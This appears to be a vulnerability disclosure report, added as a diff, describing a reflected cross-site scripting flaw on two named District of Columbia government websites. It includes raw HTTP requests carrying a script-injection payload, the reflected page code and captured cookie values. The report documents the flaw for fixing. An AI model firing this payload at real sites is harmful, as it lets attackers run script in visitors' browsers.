@@ -1,1 +1,61 @@
+Reflected XSS (Cross-Site Scripting)
+
+Type: Unauthenticated Remote attack
+
+We have identified that “https://dmv.dc.gov/” and "https://octo.dc.gov/" web sites are vulnerable to XSS attacks. This is due to that the website fails to sanitize special characters in the server side. By leveraging this issue, an attacker is able to cause arbitrary HTML and Script code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
+
+We have managed to bypass Client side protection (URL encoding) by intercepting the GET request using a HTTP proxy tool, and then inserting the XSS payload.
+
+
+Below, evidence is provided.
+
+
+Original Request:
+GET / HTTP/1.1
+Host: dmv.dc.gov
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: __cf_bm=o2glzlrNOMi83rj8R6.vlAVJiKQVXeBR0nGJHc1RhLM-1661524154-0-AfZ0lu2Hx46EJEnqwI+RnT5AYvyWEOwFuuUdEecAxsJA+yAUfLInnqeQJpD5LaEsIoI1xiQ5SttCMaYhjYNetys=; has_js=1; nmstat=58fdc482-9e54-c1c3-0b88-381d99fb062e; _ga=GA1.2.98028607.1661523511; _gid=GA1.2.1726507257.1661523511
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+
+Edited/Malicious Request:
+GET /"></script><script>alert(document.domain)</script><" HTTP/1.1
+Host: dmv.dc.gov
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: __cf_bm=o2glzlrNOMi83rj8R6.vlAVJiKQVXeBR0nGJHc1RhLM-1661524154-0-AfZ0lu2Hx46EJEnqwI+RnT5AYvyWEOwFuuUdEecAxsJA+yAUfLInnqeQJpD5LaEsIoI1xiQ5SttCMaYhjYNetys=; has_js=1; nmstat=58fdc482-9e54-c1c3-0b88-381d99fb062e; _ga=GA1.2.98028607.1661523511; _gid=GA1.2.1726507257.1661523511
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+
+Response/Affected Code:
+GET /"></script><script>alert(document.domain)</script><" HTTP/1.1
+Host: dmv.dc.gov
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: __cf_bm=o2glzlrNOMi83rj8R6.vlAVJiKQVXeBR0nGJHc1RhLM-1661524154-0-AfZ0lu2Hx46EJEnqwI+RnT5AYvyWEOwFuuUdEecAxsJA+yAUfLInnqeQJpD5LaEsIoI1xiQ5SttCMaYhjYNetys=; has_js=1; nmstat=58fdc482-9e54-c1c3-0b88-381d99fb062e; _ga=GA1.2.98028607.1661523511; _gid=GA1.2.1726507257.1661523511
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+<a rel="nofollow" class="rsbtn_play" accesskey="L" title="Listen to this page using ReadSpeaker webReader" href="//app-na.readspeaker.com/cgi-bin/rsent?customerid=6295&amp;lang=en_us&amp;readid=content-start&amp;url=https://dmv.dc.gov/"></script><script>alert(document.domain)</script><"">
 
